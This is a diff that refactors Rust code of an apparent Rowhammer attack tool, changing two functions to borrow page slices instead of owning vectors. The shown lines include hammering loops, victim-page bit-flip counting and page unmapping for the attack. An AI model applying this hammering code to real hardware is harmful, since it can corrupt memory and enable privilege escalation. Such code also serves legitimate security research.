@@ -58,10 +58,10 @@ fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64,
     Err(String::from("Couldnt parse pfns from file"))
 }
 
-fn sanity_check_attack(pages: Vec<PageCandidate>) {
+fn sanity_check_attack(pages: &[PageCandidate]) {
     println!("Initializing pages for sanity check.");
 
-    for page in &pages {
+    for page in pages {
         unsafe {
             fill_memory(
                 page.target_page.virt_addr,
@@ -79,7 +79,7 @@ fn sanity_check_attack(pages: Vec<PageCandidate>) {
     let start = Instant::now();
 
     loop {
-        for page in &pages {
+        for page in pages {
             rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
         }
 
@@ -95,7 +95,7 @@ fn sanity_check_attack(pages: Vec<PageCandidate>) {
     );
 
     // Check flips in the victim pages
-    for page in &pages {
+    for page in pages {
         let (flips, flip_offsets) = count_flips_by_bit(&page.target_page, INIT_PATTERN);
 
         println!(
@@ -105,10 +105,10 @@ fn sanity_check_attack(pages: Vec<PageCandidate>) {
     }
 }
 
-fn rowhammer_attack(pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
+fn rowhammer_attack(pages: &[PageCandidate], number_of_dummy_pages: usize) {
     println!("Initializing pages for attack.");
 
-    for page in &pages {
+    for page in pages {
         unsafe {
             fill_memory(
                 page.target_page.virt_addr,
@@ -180,7 +180,7 @@ fn rowhammer_attack(pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
                 }
             }
 
-            for page in &pages {
+            for page in pages {
                 unsafe {
                     munmap(page.target_page.virt_addr as *mut c_void, utils::PAGE_SIZE).expect(
                         &format!(
@@ -272,7 +272,7 @@ fn rowhammer_attack(pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
             }
 
             loop {
-                for page in &pages {
+                for page in pages {
                     rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
                 }
             }
@@ -368,9 +368,9 @@ pub(crate) fn main(
     }
 
     if hammer {
-        rowhammer_attack(victims, number_of_dummy_pages);
+        rowhammer_attack(&victims, number_of_dummy_pages);
     } else {
-        sanity_check_attack(victims);
+        sanity_check_attack(&victims);
     }
 
     println!("Done with attack");
